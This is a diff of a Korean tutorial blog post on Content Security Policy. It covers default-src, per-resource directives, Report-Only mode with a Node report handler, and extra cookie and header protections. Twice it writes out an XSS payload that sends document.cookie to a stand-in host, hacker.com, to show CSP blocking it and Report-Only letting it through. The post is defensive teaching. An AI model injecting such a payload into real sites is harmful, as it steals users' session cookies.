@@ -23,31 +23,35 @@ import Highlight from '@/components/mdx/Highlight'
 
 # Content Security Policy란?
 
-`Content Security Policy(CSP)`는 **크로스 사이트 스크립팅(XSS) 공격을 방어하기 위한 웹 보안 메커니즘**입니다.
+`Content Security Policy(CSP)`는 크로스 사이트 스크립팅(XSS) 공격을 방어하기 위한 웹 보안 메커니즘이다.
 
 ![Content Security Policy](/images/http-content-security-policy/thumbnail.webp)
 
-크로스 사이트 스크립팅을 기반으로 하는 보안 공격 기법들의 공통점은 출처를 알 수 없는 자바스크립트를 브라우저가 실행한다는 점입니다.
+크로스 사이트 스크립팅을 기반으로 하는 보안 공격 기법들의 공통점은 출처를 알 수 없는 자바스크립트를 브라우저가 실행한다는 점이다.
 
-W3C에서는 이를 예방할 수 있는 기술로 `Content-Security-Policy`라는 응답 헤더를 표준으로 정의했습니다.
+마치 낯선 사람이 준 USB를 무심코 컴퓨터에 꽂는 것과 같다. 어디서 왔는지 모르는 코드를 실행하면 언제든 문제가 생길 수 있다.
 
-CSP를 사용하면 웹 문서의 출처와 다른 곳에서 온 자바스크립트 실행을 차단하고 예상하지 못한 동작을 억제할 수 있습니다.
+W3C에서는 이를 예방할 수 있는 기술로 [`Content-Security-Policy`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy)라는 응답 헤더를 표준으로 정의했다.
+
+CSP를 사용하면 웹 문서의 출처와 다른 곳에서 온 자바스크립트 실행을 차단하고 예상하지 못한 동작을 억제할 수 있다.
+
+---
 
 # CSP 기본 설정 방법
 
-CSP를 적용하는 방법은 간단합니다. HTML 문서를 응답할 때 응답 헤더에 아래와 같이 추가하면 됩니다:
+CSP를 적용하는 방법은 간단하다. HTML 문서를 응답할 때 응답 헤더에 아래와 같이 추가하면 된다:
 
 ```ts
 res.setHeader('Content-Security-Policy', "default-src 'self'");
 ```
 
-서버에서 웹 문서를 응답할 때 이 `Content-Security-Policy` 헤더에 적절한 정책을 명시하면 브라우저가 이를 따르게 됩니다.
+서버에서 웹 문서를 응답할 때 이 `Content-Security-Policy` 헤더에 적절한 정책을 명시하면 브라우저가 이를 따르게 된다.
 
 ## default-src 지시자 이해하기
 
-여러 자원 형태의 정책을 지정할 수 있는데, `default-src`는 **fallback으로 동작**합니다. 다른 설정이 없으면 `default-src`의 설정값을 따르며, `'self'`는 **현재 문서의 출처**를 의미합니다.
+여러 자원 형태의 정책을 지정할 수 있는데, [`default-src`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy/default-src)는 **fallback으로 동작**한다. 다른 설정이 없으면 `default-src`의 설정값을 따르며, `'self'`는 **현재 문서의 출처**를 의미한다.
 
-따라서 위 설정은 브라우저가 **현재 출처의 자원만 사용하라는 기본값**을 명시한 것입니다.
+따라서 위 설정은 브라우저가 **현재 출처의 자원만 사용하라는 기본값**을 명시한 것이다.
 
 ![실제로, 서버에서 페이지를 불러올 때 Content-Security-Policy 헤더를 확인할 수 있다.](/images/http-content-security-policy/1.webp)
 
@@ -55,13 +59,13 @@ res.setHeader('Content-Security-Policy', "default-src 'self'");
 
 # CSP 실제 동작 확인하기
 
-서버를 실행시켜서 CSP가 어떻게 동작하는지 확인해보겠습니다.
+서버를 실행시켜서 CSP가 어떻게 동작하는지 확인해본다.
 
-브라우저는 HTML 요청을 하고 응답을 받을 때 `Content-Security-Policy` 응답 헤더를 확인합니다. `default-src 'self'`로 지정했기 때문에 이 문서의 출처(`matthew.com`)가 아닌 곳에서 온 리소스는 실행하지 않습니다.
+브라우저는 HTML 요청을 하고 응답을 받을 때 `Content-Security-Policy` 응답 헤더를 확인한다. `default-src 'self'`로 지정했기 때문에 이 문서의 출처(`matthew.com`)가 아닌 곳에서 온 리소스는 실행하지 않는다.
 
 ## XSS 공격 시뮬레이션
 
-가령 `fetch` 함수를 실행하는 악성 스크립트를 주입해보겠습니다. input에 아래와 같이 입력해보세요:
+가령 `fetch` 함수를 실행하는 악성 스크립트를 주입해본다. input에 아래와 같이 입력해본다:
 
 ```ts
 <script>fetch(`http://hacker.com:8081?cookie=${document.cookie}`)</script>
@@ -71,53 +75,55 @@ res.setHeader('Content-Security-Policy', "default-src 'self'");
 
 ## CSP 차단 결과 분석
 
-네트워크 탭을 확인하면 `hacker.com`으로 네트워크 요청이 발생하지 않은 것을 확인할 수 있습니다:
+네트워크 탭을 확인하면 `hacker.com`으로 네트워크 요청이 발생하지 않은 것을 확인할 수 있다:
 
 ![네트워크 요청이 발생하지 않음](/images/http-content-security-policy/3.webp)
 
-브라우저 콘솔에는 **Content Security Policy** 경고가 표시됩니다. "다음 지시자를 위반했기 때문에 인라인 스크립트가 실행되지 않도록 차단했습니다"라는 메시지를 볼 수 있습니다. 이는 브라우저가 CSP 정책을 올바르게 이행한 것입니다.
+브라우저 콘솔에는 **Content Security Policy** 경고가 표시된다. "다음 지시자를 위반했기 때문에 인라인 스크립트가 실행되지 않도록 차단했습니다"라는 메시지를 볼 수 있다. 이는 브라우저가 CSP 정책을 올바르게 이행한 것이다.
+
+마치 건물 출입구의 보안 요원이 출입증이 없는 사람을 막는 것과 같다. 허가되지 않은 스크립트는 애초에 실행되지 않는다.
 
 ### 인라인 스타일도 차단됨
 
-흥미로운 점은 인라인 스타일도 차단된다는 것입니다:
+흥미로운 점은 인라인 스타일도 차단된다는 것이다:
 
 ![인라인 스타일이 적용되지 않도록 차단했습니다](/images/http-content-security-policy/4.webp)
 
-실제로 우리 문서에 있는 인라인 스타일(`width:600px`)도 제대로 적용되지 않습니다:
+실제로 우리 문서에 있는 인라인 스타일(`width:600px`)도 제대로 적용되지 않는다:
 
 ![width:600px이 있지만, 제대로 적용이 안되어 있을 것이다.](/images/http-content-security-policy/5.webp)
 
-CSP는 인라인 스크립트뿐만 아니라 **인라인 스타일까지 차단**하여 보안을 강화합니다.
+CSP는 인라인 스크립트뿐만 아니라 **인라인 스타일까지 차단**하여 보안을 강화한다.
 
 ---
 
 # CSP 세부 설정하기
 
-실제 서비스에서는 다른 출처의 리소스를 사용해야 하는 경우가 많습니다. 예를 들어 **CDN에서 제공하는 CSS 라이브러리**, **외부 이미지**, **폰트** 등은 다른 출처에서 가져오기 마련입니다.
+실제 서비스에서는 다른 출처의 리소스를 사용해야 하는 경우가 많다. 예를 들어 **CDN에서 제공하는 CSS 라이브러리**, **외부 이미지**, **폰트** 등은 다른 출처에서 가져오기 마련이다.
 
-CSP는 이런 상황을 고려하여 **자원 종류별로 보안 정책을 세분화**할 수 있습니다.
+CSP는 이런 상황을 고려하여 **자원 종류별로 보안 정책을 세분화**할 수 있다.
 
 ## CSP 정책 예시
 
 ### 1. 기본 정책 - 자체 출처만 허용
 
-```ts
+```http
 Content-Security-Policy: default-src 'self'
 ```
 
-모든 콘텐츠가 사이트 자체의 출처(하위 도메인 제외)에서만 오도록 설정합니다.
+모든 콘텐츠가 사이트 자체의 출처(하위 도메인 제외)에서만 오도록 설정한다.
 
 ### 2. 신뢰할 수 있는 도메인 추가
 
-```ts
+```http
 Content-Security-Policy: default-src 'self' example.com *.example.com
 ```
 
-신뢰할 수 있는 도메인 및 하위 도메인의 콘텐츠를 허용합니다. CSP가 설정된 도메인과 동일할 필요는 없습니다.
+신뢰할 수 있는 도메인 및 하위 도메인의 콘텐츠를 허용한다. CSP가 설정된 도메인과 동일할 필요는 없다.
 
 ### 3. 리소스별 세분화된 정책
 
-```ts
+```http
 Content-Security-Policy: default-src 'self';
                          img-src *;
                          media-src example.org example.net;
@@ -127,15 +133,15 @@ Content-Security-Policy: default-src 'self';
 이 정책의 의미:
 
 - **default-src 'self'**: 기본적으로 현재 출처(`matthew.com`)의 리소스만 허용
-- **img-src \***: 이미지는 모든 출처에서 허용
-- **media-src**: 오디오/비디오는 `example.org`와 `example.net`에서만 허용
-- **script-src**: 자바스크립트는 `userscripts.example.com`에서만 허용
+- **[`img-src`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy/img-src) \***: 이미지는 모든 출처에서 허용
+- **[`media-src`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy/media-src)**: 오디오/비디오는 `example.org`와 `example.net`에서만 허용
+- **[`script-src`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)**: 자바스크립트는 `userscripts.example.com`에서만 허용
 
-> **참고 자료**: CSP에 대한 더 자세한 정보는 [MDN Web Docs - Content Security Policy](https://developer.mozilla.org/ko/docs/Web/HTTP/Guides/CSP)에서 확인할 수 있습니다.
+> **참고 자료**: CSP에 대한 더 자세한 정보는 [MDN - Content Security Policy](https://developer.mozilla.org/ko/docs/Web/HTTP/CSP)에서 확인할 수 있다.
 
-### ⚠️ CSP 적용 시 주의사항
+### CSP 적용 시 주의사항
 
-CSP를 너무 엄격하게 설정하면 정상적인 기능까지 제한될 수 있습니다.
+CSP를 너무 엄격하게 설정하면 정상적인 기능까지 제한될 수 있다.
 
 **실제 발생할 수 있는 문제들:**
 
@@ -144,23 +150,25 @@ CSP를 너무 엄격하게 설정하면 정상적인 기능까지 제한될 수 
 - **소셜 로그인** 버튼이 작동하지 않음
 - **웹폰트**가 로드되지 않아 디자인이 깨짐
 
-이는 마치 건물 보안을 강화한다고 모든 출입문을 막아버려서, 정작 직원들도 출입하지 못하는 상황과 같습니다. 따라서 CSP는 **단계적으로 적용**하면서 서비스에 미치는 영향을 **지속적으로 모니터링**해야 합니다.
+이는 마치 건물 보안을 강화한다고 모든 출입문을 막아버려서, 정작 직원들도 출입하지 못하는 상황과 같다. 따라서 CSP는 **단계적으로 적용**하면서 서비스에 미치는 영향을 **지속적으로 모니터링**해야 한다.
 
 ---
 
 # CSP Report-Only 모드
 
-CSP를 단계적으로 적용하기 위한 방법으로 **Report-Only 모드**가 있습니다. 이 모드에서는:
+CSP를 단계적으로 적용하기 위한 방법으로 **Report-Only 모드**가 있다. 이 모드에서는:
 
 1. 브라우저가 정책 위반을 **진단만** 하고
 2. 리소스 로드는 **차단하지 않고** 그대로 실행
 3. 진단 결과를 **서버로 보고**
 
-이를 통해 실제 서비스에 영향을 주지 않으면서 잠재적인 보안 위협을 파악할 수 있습니다.
+이를 통해 실제 서비스에 영향을 주지 않으면서 잠재적인 보안 위협을 파악할 수 있다.
+
+마치 건물에 CCTV를 먼저 설치해서 출입 패턴을 분석한 다음, 그 데이터를 바탕으로 보안 규칙을 만드는 것과 같다.
 
 ## Report-Only 모드 설정하기
 
-`Content-Security-Policy-Report-Only` 응답 헤더를 사용합니다:
+[`Content-Security-Policy-Report-Only`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only) 응답 헤더를 사용한다:
 
 ```ts
 res.setHeader(
@@ -169,11 +177,11 @@ res.setHeader(
 );
 ```
 
-이 설정은 정책 위반을 진단만 하고 실행은 허용합니다. 대신 리포트를 `/report` 경로로 전송합니다.
+이 설정은 정책 위반을 진단만 하고 실행은 허용한다. 대신 리포트를 `/report` 경로로 전송한다.
 
 ## 서버에서 리포트 받기
 
-서버는 CSP 위반 리포트를 받을 준비를 해야 합니다:
+서버는 CSP 위반 리포트를 받을 준비를 해야 한다:
 
 ```ts
 const report = (req, res) => {
@@ -184,10 +192,10 @@ const report = (req, res) => {
   });
 
   req.on('end', () => {
-    // JSON 형태의 본문을 받는다.
+    // JSON 형태의 본문을 받는다
     const report = JSON.parse(body);
 
-    // 리포트를 출력합니다.
+    // 리포트를 출력한다
     console.log('CSP Report:', report);
 
     res.end();
@@ -195,7 +203,7 @@ const report = (req, res) => {
 };
 ```
 
-라우팅에 리포트 핸들러를 추가합니다:
+라우팅에 리포트 핸들러를 추가한다:
 
 ```ts
 const server = http.createServer((req, res) => {
@@ -215,15 +223,15 @@ server.listen(8080, () => {
 
 ## Report-Only 모드 테스트
 
-사이트에 접속하면 즉시 `/report` 경로로 리포트가 전달됩니다:
+사이트에 접속하면 즉시 `/report` 경로로 리포트가 전달된다:
 
 ![/report 경로로 리포트가 전달됨](/images/http-content-security-policy/6.webp)
 
 ### 리포트 내용 분석
 
-요청 본문에는 JSON 형식의 데이터가 포함됩니다. `effective-directive`를 보면 `style-src-elem`이라고 되어 있는데, 이는 **인라인 스타일이 정책을 위반**했다는 의미입니다.
+요청 본문에는 JSON 형식의 데이터가 포함된다. `effective-directive`를 보면 `style-src-elem`이라고 되어 있는데, 이는 **인라인 스타일이 정책을 위반**했다는 의미다.
 
-서버 콘솔에서도 CSP 리포트를 확인할 수 있습니다:
+서버 콘솔에서도 CSP 리포트를 확인할 수 있다:
 
 ![서버에서 보고서를 받아볼 수 있다.](/images/http-content-security-policy/7.webp)
 
@@ -232,11 +240,11 @@ server.listen(8080, () => {
 - **일반 CSP**: 진단하고 실행을 **차단**
 - **Report-Only**: 진단만 하고 실행은 **허용**
 
-Report-Only 모드에서는 인라인 스타일도 정상 동작하고, 심지어 악성 스크립트도 실행됩니다.
+Report-Only 모드에서는 인라인 스타일도 정상 동작하고, 심지어 악성 스크립트도 실행된다.
 
 ## 악성 스크립트 테스트
 
-로그인 후 input에 아래 스크립트를 입력해보세요:
+로그인 후 input에 아래 스크립트를 입력해본다:
 
 ```ts
 <script>fetch(`http://hacker.com:8081?cookie=${document.cookie}`)</script>
@@ -244,9 +252,9 @@ Report-Only 모드에서는 인라인 스타일도 정상 동작하고, 심지�
 
 ![스크립트가 주입이 됨을 확인할 수 있음 CSP가 진단만 하기 때문](/images/http-content-security-policy/8.webp)
 
-입력하면 `hacker.com`에 쿠키 값이 **실제로 유출**됩니다. Report-Only 모드는 진단만 하고 스크립트 실행은 허용하기 때문입니다.
+입력하면 `hacker.com`에 쿠키 값이 **실제로 유출**된다. Report-Only 모드는 진단만 하고 스크립트 실행은 허용하기 때문이다.
 
-대신 이런 보안 위반 사항들이 서버로 리포트됩니다:
+대신 이런 보안 위반 사항들이 서버로 리포트된다:
 
 ![서버에 쿠키 관련 리포트가 보고됨](/images/http-content-security-policy/9.webp)
 
@@ -256,13 +264,13 @@ Report-Only 모드에서는 인라인 스타일도 정상 동작하고, 심지�
 
 ## Google의 CSP 사례 분석
 
-CSP가 현업에서 어떻게 활용되는지 Google의 사례를 살펴보겠습니다.
+CSP가 현업에서 어떻게 활용되는지 Google의 사례를 살펴본다.
 
-Google 문서를 요청하면 응답 헤더에 CSP 관련 헤더가 포함되어 있습니다:
+Google 문서를 요청하면 응답 헤더에 CSP 관련 헤더가 포함되어 있다:
 
 ![구글의 CSP 사례](/images/http-content-security-policy/10.webp)
 
-Google은 **Report-Only 모드**를 사용하여 진단만 하고 리소스 로딩은 허용합니다:
+Google은 **Report-Only 모드**를 사용하여 진단만 하고 리소스 로딩은 허용한다:
 
 ![구글의 CSP 리포트 보고서](/images/http-content-security-policy/11.webp)
 
@@ -280,17 +288,17 @@ Google이 Report-Only를 사용하는 이유:
 
 ## CSP만으로는 충분하지 않다
 
-CSP는 **크로스 사이트 스크립팅(XSS) 공격 방어**에는 효과적이지만, **CSRF와 같은 다른 유형의 공격**은 막지 못합니다.
+CSP는 **크로스 사이트 스크립팅(XSS) 공격 방어**에는 효과적이지만, **CSRF와 같은 다른 유형의 공격**은 막지 못한다.
 
-따라서 진정한 웹 보안을 위해서는 CSP와 함께 다양한 보안 조치를 종합적으로 적용해야 합니다.
+따라서 진정한 웹 보안을 위해서는 CSP와 함께 다양한 보안 조치를 종합적으로 적용해야 한다.
 
 ## 추가적인 보안 조치들
 
 ### 1. 쿠키 보안 설정
 
-- **`SameSite` 속성**: CSRF 공격 방어
-- **`HttpOnly` 속성**: 클라이언트 측 스크립트의 쿠키 접근 차단
-- **`Secure` 속성**: HTTPS 연결에서만 쿠키 전송
+- **[`SameSite`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie/SameSite) 속성**: CSRF 공격 방어
+- **[`HttpOnly`](https://developer.mozilla.org/ko/docs/Web/HTTP/Cookies#httponly_%EC%BF%A0%ED%82%A4) 속성**: 클라이언트 측 스크립트의 쿠키 접근 차단
+- **[`Secure`](https://developer.mozilla.org/ko/docs/Web/HTTP/Cookies#secure_%EC%BF%A0%ED%82%A4) 속성**: HTTPS 연결에서만 쿠키 전송
 
 ### 2. 입력 데이터 검증
 
@@ -300,16 +308,26 @@ CSP는 **크로스 사이트 스크립팅(XSS) 공격 방어**에는 효과적�
 
 ### 3. 추가 보안 헤더
 
-- **`X-Frame-Options`**: 클릭재킹 방어
-- **`X-Content-Type-Options`**: MIME 타입 스니핑 방지
-- **`Strict-Transport-Security`**: HTTPS 강제
+- **[`X-Frame-Options`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Frame-Options)**: 클릭재킹 방어
+- **[`X-Content-Type-Options`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Content-Type-Options)**: MIME 타입 스니핑 방지
+- **[`Strict-Transport-Security`](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Strict-Transport-Security)**: HTTPS 강제
+
+---
 
 ## 마치며
 
-끊임없이 새로운 보안 공격들이 개발되고 있기 때문에, 단일 보안 조치만으로는 충분하지 않습니다.
+끊임없이 새로운 보안 공격들이 개발되고 있기 때문에, 단일 보안 조치만으로는 충분하지 않다.
 
-<Highlight color="green">다층 방어(Defense in Depth)</Highlight> 전략을 통해 여러 보안 계층을 구축하고, 기본적인 보안 지식을 바탕으로 꾸준히 학습하며 실무에 적용하는 것이 중요합니다.
+`다층 방어(Defense in Depth)` 전략을 통해 여러 보안 계층을 구축하고, 기본적인 보안 지식을 바탕으로 꾸준히 학습하며 실무에 적용하는 것이 중요하다.
 
 :::note
-**보안은 기능이 아니라 프로세스입니다.** 지속적인 모니터링, 업데이트, 그리고 개선이 필요한 영역입니다.
+**핵심 정리**
+
+- **CSP란**: XSS 공격을 방어하기 위한 HTTP 응답 헤더 기반 보안 메커니즘
+- **기본 설정**: `Content-Security-Policy: default-src 'self'`로 현재 출처만 허용
+- **세부 설정**: `script-src`, `img-src`, `style-src` 등으로 리소스별 정책 지정 가능
+- **Report-Only 모드**: 정책 위반을 차단하지 않고 보고만 하여 단계적 적용 가능
+- **종합적 보안**: CSP만으로는 부족하며, 쿠키 보안, 입력 검증, 추가 보안 헤더 등을 함께 적용해야 한다
+
+**보안은 기능이 아니라 프로세스다.** 지속적인 모니터링, 업데이트, 그리고 개선이 필요한 영역이다.
 :::
